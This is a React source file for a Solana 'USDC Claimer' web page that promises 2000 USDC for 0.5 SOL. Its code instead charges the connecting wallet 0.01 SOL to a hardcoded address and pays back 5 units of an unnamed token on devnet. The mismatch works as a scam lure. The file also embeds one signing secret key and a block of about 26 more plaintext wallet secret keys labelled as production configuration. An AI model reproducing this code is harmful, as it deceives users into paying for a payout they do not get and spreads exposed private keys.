/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2CAA8cfZBxrQhTGu4Totawzsvsoc93fMEwgR1aKuB73dNJzr1cNSD9T1Cm7BRu2PsjqAbPPjH8Xf2hQujx7QasB4"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3av67DwCccMWwiANcfwf4DqfkrC4fhzDwJcA3bL84EAYMemGQfVh5tb3cYtVvCu1tz7fVCnAPMQmGutavtZL72eM",
  "key1": "4Tm1Ex9f9xQuZ1mE4jWJRvejcoJDhD3JSNeKMMQXWBsuF6EHYr2KDgUqJGXRsVreXWF9zuahnRRoNmiob9xREBzb",
  "key2": "3tpxgap3svzqorNsAWAugvKBe6MakPRbMWYmamDwP9mZwcWMkmyoQpgEYw2tvvrjpNtnuo7f3S2pxv8UsHnxE543",
  "key3": "5krPfNYirf5a5cMpjduTgCQX4jyBs6znXYZNu78qbiJqeLzqKWSpxg1KonpPubT2355wM43kZU6XiqRvDfxPKvrd",
  "key4": "4mi4bPKZW2pYCU3MwNBH6LmMabfLt7wfKCiJhDjzxrNAWYrvEmqDRXK4QpWKd64teuejJ5fGd8TWoubydCjEpf5B",
  "key5": "5xUb76QPWSC7gM5cNVdBjPRheoGjUyeff7CJNSo1xuHxvoJY1xUEQENz7syUbQ2h5A8uBtgZ2U2eZH5HCS357F1R",
  "key6": "223sGw1XLeAdxta73A5vXRdRY1Zs3DkBhHNK7x8kQfHawUF92BVk2AmHNooP5VbQqwKwtFrc9qhyYrRmC6eBWVVQ",
  "key7": "2JhHk3nPpkGCp7mHarVS9ebGRc48ExwUiuj6554NyuovyXomqrSYfSKsoZTyekDQ3194yZUKL4g3Yx1aCSNmXCed",
  "key8": "YS1AWzXCs8adsRwiEXjiRsAZrpmjK4BVFN5PErauMMN2K8idHnMfgxYKCd7uCSR2UHgBvQMfDhX2FDU4BmQXr3L",
  "key9": "58D7bBkHi8KYgNcFhmwB1Xe9Hvoo7nvG4DwggpDgCCr1DFPqvVG9iH9mUdxbQGzrjRUGPpmFjtgok7LTKcZ4URqv",
  "key10": "4fswqnoXmNhrvUh3mJCxkFB9iu4dmib2NRbUMATSHm9TK1nfnj698cT3zzXCQvd8p4CwQxhSAV24xQJetD44arHs",
  "key11": "JxSDLverGZTijUZCVnoRmPSFTDyDVNNKwhgDGxYaWwiPeBqM8cMfGAWUxa7gTGudUMTTBaZnnSjoudisR4UG8wM",
  "key12": "Yc4Rk19ZwpKWpiTn9yuWdf6EmJnkRP6DVdYZyWTsqRMpswiPiFUQp8ThMgbw4pCpWbVLyRoTZ8RpBxSKz2z22bg",
  "key13": "5vfNSZdzuGWKZ4fhBFzbFx8zSBrJeiVhtVKW65FarZckbQUh3UM7SUCLWCikQ7R4Q886vnXKWfR4dsTdZ6JcsaaT",
  "key14": "5RPcwhstj22R1EvjEzErbezvfF6sN8ZpkzNzSEYGU8Gnr881fsp83vKP6S3qQRpZUu1yMzh7SQyVmZ9AkGR7WiWM",
  "key15": "vNb9ibVxWpujcTbpJ6WTNAcsHiiKDF8CenrHBam4patWfoyN7PeBrRpi9rKY5oXPbwLTCkCcoVco3rf4YSxEtHo",
  "key16": "4g4hnR2U2zDhzx9EdTtwPzTHD3wuzbzBjN9veJV3g3YW5MyMb3q6kXAGjKgeimqSMCH9iJUMdgrunbhPhhDiyqJx",
  "key17": "4NwnEWFa6SUEUYAnXMFxeAVo1AwYAvikwVJ3RqtVttXxgRXQm2JrcZ9HJ3Zv6B8KMMo1HLFeFjvz1KCgzuaB23AN",
  "key18": "51n59byjjYYikaTyENXGPTpoMkYHanD9xMEEV3RgHGm1BBViKqrXiaiU7AqTJaEewB8egLfVNdvoa23yZMfgLXZE",
  "key19": "svSAhGVZZB3J4YAQF4HaqfsxuWzc9HPNa9LBv3krGVSzJ4vPVc9FVQKSpEjQZ14ov1XLvu3ejjXYYFrPvj71fpo",
  "key20": "4cKW2FFMcB7mH2K4nUXMPCw2HoExE8KoKz3YUxmqpDhwKgHNpX6iojLVCvbVNQkGzA1tWXAci6Q52woLEKT4Xgtj",
  "key21": "43ftCKq4ozLszjeoDdABnKLnTNm1KDHRMHP4ooEbdQsm8nhx1ackpL9uJ3iYU1tLowhkjsxhi379g5uykhuYgwoS",
  "key22": "2RsTqFgMJmUGN4W4bGTNkqjgp5Xv7RXAue2AroC7MWk7ep6mebjkK8wtyVTdNDD7ocUiJHhRa2YnT856viYSY1zw",
  "key23": "4Y38KjYoBDAKZVLdcNnVgpgCccewms2fqdxMRJX8FSeUGXnyq79j7fLotxFfiGF7GFTMudDiqk8NYfQTc9UJbycU",
  "key24": "236bxcwc2NptHn94LPQtdjPoia9DQGCdFm9u9Wkqa59754AM6BQUz4ANhVRQHUZKVgCQivsfSBSdxjnjUzchuzQL",
  "key25": "4Zrref65irnTpeKaWtnkekcATcanCPaVpo4NyfHuM35AbmGX53N8QGajc3snTT5eEZUDSCNp9f8spY4hLt3jhPiw"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
